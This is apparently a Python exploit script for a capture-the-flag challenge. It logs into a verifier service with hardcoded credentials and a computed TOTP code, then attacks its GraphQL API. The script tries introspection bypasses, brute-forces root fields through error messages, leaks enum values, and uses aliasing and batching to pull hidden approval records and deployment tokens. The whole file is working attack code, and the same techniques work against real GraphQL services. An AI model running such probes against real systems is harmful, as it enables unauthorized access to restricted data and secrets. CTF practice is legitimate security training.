#!/usr/bin/env python3
"""WHOLE DIFFERENT APPROACH: drop the cipher, exploit verifier GraphQL to pull the
hidden approvals AP-1004/1005/1006/1008 (their 'ref' is a deployment-token lead)."""
import re, json, base64, hmac, hashlib, struct, time
import requests, urllib3
urllib3.disable_warnings()
V="https://verifier.hackthe.website"; TOTP="JBSWY3DPEHPK3PXP"
FLAG=re.compile(r'dome\.ctf\{[^}]+\}')
def totp():
    k=base64.b32decode(TOTP); h=hmac.new(k,struct.pack(">Q",int(time.time()//30)),hashlib.sha1).digest(); o=h[-1]&15
    return str((struct.unpack(">I",h[o:o+4])[0]&0x7fffffff)%10**6).zfill(6)
s=requests.Session(); s.verify=False
s.headers.update({"User-Agent":"Mozilla/5.0","Content-Type":"application/json"})
s.post(f"{V}/api/login", json={"username":"ops_dispatcher","password":"Ops-Fall-2026!"}, timeout=20)
s.post(f"{V}/api/otp/verify", json={"otp":totp()}, timeout=20)
def gql(q, variables=None):
    r=s.post(f"{V}/graphql", json={"query":q,"variables":variables or {}}, timeout=20)
    return r.status_code, r.text
def show(q):
    st,t=gql(q)
    print(f"  {q[:70]} -> {t[:260]}")
    for m in FLAG.finditer(t): print("    *** FLAG:",m.group())
    return t

print("=== 1) introspection bypasses ===")
for q in [
  "{__typename}",
  "{__type(name:\"Approval\"){name fields{name type{name kind ofType{name}}}}}",
  "{__type(name:\"Query\"){name fields{name args{name type{name}}}}}",
  "{__type(name:\"Mutation\"){name fields{name args{name type{name}}}}}",
  "{__schema{types{name}}}",
  "query{__type(name:\"ApprovalStatus\"){enumValues{name}}}",
  "query{__type(name:\"Status\"){enumValues{name}}}",
]:
    show(q)

print("\n=== 2) root field brute (error oracle) ===")
roots=["approval","approvals","allApprovals","adminApprovals","pendingApprovals","deniedApprovals",
 "archivedApprovals","hiddenApprovals","internalApprovals","restrictedApprovals","approvalsAll",
 "approvalByRef","approvalById","approvalByRef","findApproval","searchApprovals","node","nodes",
 "deployment","deploymentToken","runnerToken","token","tokens","secret","audit","record","records"]
valid=[]
for f in roots:
    st,t=gql("{%s}"%f)
    if "Cannot query field '%s'"%f not in t:
        valid.append(f); print(f"  VALID root: {f}  ::  {t[:140]}")
print("valid roots:",valid)

print("\n=== 3) status enum discovery (unquoted => enum error leaks values) ===")
for val in ["PENDING","APPROVED","DENIED","REJECTED","ESCALATED","HIDDEN","RESTRICTED","ALL","INTERNAL","ARCHIVED","REVOKED","SEALED","DEPLOY","DEPLOYMENT"]:
    st,t=gql('{approvals(status:%s){id approvedBy ref}}'%val)
    if "AP-100" in t and '"errors"' not in t:
        ids=re.findall(r'"id":"(AP-\d+)"',t)
        if set(ids)-{"AP-1001","AP-1002","AP-1003","AP-1007","AP-1009","AP-1010","AP-1011"}:
            print(f"  status={val} NEW IDS: {t[:400]}")
    elif "did you mean" in t.lower() or "enum" in t.lower():
        print(f"  status={val} hint: {t[:200]}")

print("\n=== 4) aliasing/batching to fetch hidden ids ===")
# if there is a by-id/ref field, try it; else alias approvals with each status
alias_q="{" + " ".join(f'a{n}:approvals(status:\"{st}\"){{id ref}}' for n,st in enumerate(["pending","denied","escalated","restricted","internal","archived"])) + "}"
show(alias_q)

print("\n=== 5) full approvals with every field ===")
show("{approvals{id approvedBy ref}} {allApprovals{id approvedBy ref}}")

print("\n=== 6) mutations ===")
for m in ["approve","deny","createApproval","requestApproval","revoke","issueToken","grant"]:
    st,t=gql('mutation{%s{id}}'%m)
    if "Cannot query field '%s'"%m not in t and "only be defined" not in t:
        print(f"  mutation {m}: {t[:160]}")
